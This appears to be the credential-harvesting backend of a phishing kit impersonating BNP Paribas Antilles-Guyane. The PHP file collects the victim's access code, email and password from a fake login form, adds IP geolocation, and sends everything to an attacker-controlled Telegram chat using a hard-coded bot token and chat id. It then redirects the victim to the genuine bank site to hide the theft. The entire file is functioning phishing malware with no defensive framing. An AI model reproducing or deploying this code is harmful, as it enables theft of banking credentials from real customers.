<?php

include 'antibots.php';

/**$message = "";
while (list($key, $val) = each($_POST)) {if(!empty($val)) {$message .= "$key : $val\n";}}**/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD = $RZ3->geoplugin_countryCode ; // Country
$STCD = $RZ3->geoplugin_regionCode ; //  State

$message = "";

$message .= "==========  Shyne BNP Antilles ==========\n";
$message .= "Code vkid : ".$_POST['vkid']."\n";
$message .= "Adresse E-mail : ".$_POST['p0']."\n";
$message .= "Mot de passe : ".$_POST['p1']."\n"; 
$message .= "Country : ".$CNCD."\n";
$message .= "City : ".$STCD."\n";
$message .= "From : ".$ip."\n";
$message .= "==========  Shyne BNP Antilles  =========\n";

include './extra/extra.php';
/**$message = "";

while ([$key = key($_POST), $val = current($_POST)])
    
     {
           if(!empty($val)) {
                $message .= "$key : $val\n";
                
            }
            
        }**/

$telegram = new Telegram('5066037288:AAEw2KT0cU37dr0q7z90zWGu5qd-6ZvsREQ');
$chat_id = 2011330617 ;
$content = array('chat_id' => $chat_id, 'text' => $message);
$send = $telegram->sendMessage($content);

 
 header('location: https://antilles-guyane.bnpparibas.net/part/fr/dciweb.htm?p0=idesai.tht&t=p');
 
 ?>